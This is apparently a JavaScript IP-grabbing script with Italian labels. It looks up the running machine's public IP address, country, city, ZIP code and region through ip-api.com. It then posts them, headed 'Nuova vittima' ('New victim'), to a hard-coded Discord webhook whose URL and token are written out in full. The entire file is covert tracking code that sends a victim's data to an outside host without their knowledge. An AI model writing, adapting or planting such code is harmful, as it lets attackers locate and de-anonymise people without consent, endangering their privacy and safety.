const webhook = "https://discord.com/api/webhooks/1289283713561264222/eKdN48Evwa7rbZObuExV5y9isBMdlhCVCPEKyw1GM0nOPkFlMkobYBZRJNBbXcwWT8dG"

async function IP_Info(){
    
    let response = await fetch("http://ip-api.com/json", {
      method: 'GET',
      headers: {
        "cache-control" : "no-cache",
        "content-type": "application/json"
      }
    })
    return response.json()
  }
  IP_Info().then((value)=> {
    let requiredInfo = [
      "status","country", "city", "zip", "regionName"
    ]
    let noData = false

    for(var i = 0; i < requiredInfo.length; i++){
      if(typeof(value[`${requiredInfo[i]}`]) === 'undefined'){
        noData = true
        break
      } 
    }
    if(noData){
      return null
    }
    return value
  }).then( async (value) => {
    if(value !== null){
       await fetch(webhook, {
        method: 'POST',
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content:"``Nuova vittima``",
          embeds: [{
              title: "IP",
              type:"rich",
              color: "12223968",
              fields: [{
                name: "IP", value: `${value.query}`, inline: false
              },
              {
                name: "Nazione", value: `${value.country}`, inline: false
              },
              {
                name: "Città", value: `${value.city}`, inline: false
              },
              {
                name: "ZIP", value: `${value.zip}`, inline: false
              },
              {
                name: "Regione", value: `${value.regionName}`, inline: false
              }
              ],
              
          }]
        })
      }).then((value)=>{
        console.log(value.statusText)
      }).catch((err)=>{
        console.log(err)
      })
    }
  }).catch((err)=> {
    console.log(err)
    console.log('Request not send')
  })